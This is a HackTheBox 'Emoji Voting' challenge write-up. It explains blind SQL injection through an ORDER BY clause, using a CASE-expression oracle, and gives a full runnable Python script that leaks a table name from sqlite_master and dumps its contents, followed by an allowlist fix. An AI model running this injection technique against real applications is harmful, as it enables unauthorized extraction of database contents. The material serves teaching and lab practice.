---
title: "Emoji Voting"
date: 2027-08-08 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, sql-injection, order-by, blind-sqli, sqlite]
description: "A voting app sorts emojis by a user-supplied ORDER BY column. You can't UNION or comment your way out of an ORDER BY clause — so you turn the sort order itself into a one-bit oracle with a CASE expression and read the whole database blind."
---

## Overview

`Emoji Voting` is an Easy HackTheBox **Web** challenge. The app lets you list and vote on emojis; the listing endpoint sorts the results by a column name you control. That column name is concatenated straight into a SQL `ORDER BY` clause — a [SQL injection](https://cwe.mitre.org/data/definitions/89.html), but one where the usual `UNION`/comment tricks don't apply. The flag lives in a randomly-named table, and the only leverage you have is *how the rows get sorted*. That's enough.

## The technique

`ORDER BY` injection is its own beast. The clause sits at the **end** of the statement and the column list and row set are already fixed, so you can't append a `UNION SELECT`, and there's no trailing SQL to comment out. The one thing you *do* control is the sort order — and a sort order is a comparison, which is a boolean, which is one bit of information.

The vulnerable code (`database.js`):

```js
async getEmojis(order) {
    // TOOD: add parametrization
    let query = `SELECT * FROM emojis ORDER BY ${ order }`;   // CWE-89
    return await this.db.all(query);
}
```

`order` is taken verbatim from the JSON body of `POST /api/list`.

To build a one-bit oracle, drop a `CASE` expression into the sort-key slot and pick two columns whose ascending sort puts a **different row first**:

```sql
ORDER BY (CASE WHEN (<condition>) THEN count ELSE id END)
```

| sort key | first row id |
|----------|--------------|
| `id`     | **1** (👽 alien) |
| `count`  | **3** (👾 alien monster — count 0, the lowest) |

So if the condition is **true**, the rows come back sorted by `count` and the first row's id is `3`; if **false**, they're sorted by `id` and the first id is `1`. Reading `response[0].id` is now a clean true/false read. With that, you binary-search the length of any value, then each character via `unicode(substr(...))`.

The flag is seeded into a table named `flag_<random hex>` (`crypto.randomBytes(5)` → 10 hex chars), so the solve is two stages: first leak the table name out of `sqlite_master`, then dump the flag from it.

## Solution

The full extractor — runnable verbatim:

```python
#!/usr/bin/env python3
import sys, requests

T = sys.argv[1]
URL = f"http://{T}/api/list"
S = requests.Session()

def oracle(cond):
    payload = f"(CASE WHEN ({cond}) THEN count ELSE id END)"
    for _ in range(6):
        try:
            data = S.post(URL, json={"order": payload}, timeout=15).json()
            if isinstance(data, list) and data:
                return data[0]["id"] == 3
        except Exception:
            pass
    raise RuntimeError(f"oracle failed: {cond}")

def leak_int(expr, hi=128):
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr}) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def leak_string(expr):
    n = leak_int(f"length(({expr}))")
    out = ""
    for pos in range(1, n + 1):
        out += chr(leak_int(f"unicode(substr(({expr}),{pos},1))", 0x7f))
        sys.stdout.write(out[-1]); sys.stdout.flush()
    print()
    return out

tbl = leak_string("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'flag_%' LIMIT 1")
flag = leak_string(f"SELECT flag FROM {tbl} LIMIT 1")
print(f"[+] FLAG: {flag}")
```

Run it against the instance:

```bash
python3 solve.py <target-host>:<port>
# flag_xxxxxxxxxx
# HTB{...}
```

Two details that matter in practice:

- **Retry non-array responses.** A malformed `CASE`/subquery trips the route's `try/catch`, which returns `{"message": "Something went wrong"}` — a dict, not a row list. Without a retry that ignores non-arrays, a single transient error reads as a *flipped bit* and silently corrupts the output.
- **Leak `length()` first.** Don't rely on a substr-past-end stop condition: `substr` past the end returns `''`, and `unicode('')` is `NULL` — and `NULL = 0` is `NULL` (falsy), so a "stop when char is 0" test never fires and you append garbage. Reading the exact length up front avoids this.

## Why it worked

The column used in `ORDER BY` was built by string interpolation of untrusted input. Even though an `ORDER BY` clause can't be exploited the "classic" way (no `UNION`, no comment terminator), a `CASE` expression in the sort key leaks one bit per request through the *observable order* of the returned rows — and one bit at a time is all blind SQLi ever needs.

## Fix / defense

The column and direction in an `ORDER BY` **cannot** be bound as query parameters, so parameterization alone doesn't help here. The fix is a strict allowlist that maps the user's input to a known-good column and direction:

```js
const COLS = { id: 'id', name: 'name', count: 'count' };
const DIRS = { asc: 'ASC', desc: 'DESC' };
async getEmojis(col, dir) {
  const c = COLS[col] || 'id', d = DIRS[dir] || 'ASC';
  return await this.db.all(`SELECT * FROM emojis ORDER BY ${c} ${d}`);
}
```

Anything outside the enum falls back to a safe default and never reaches the query string.
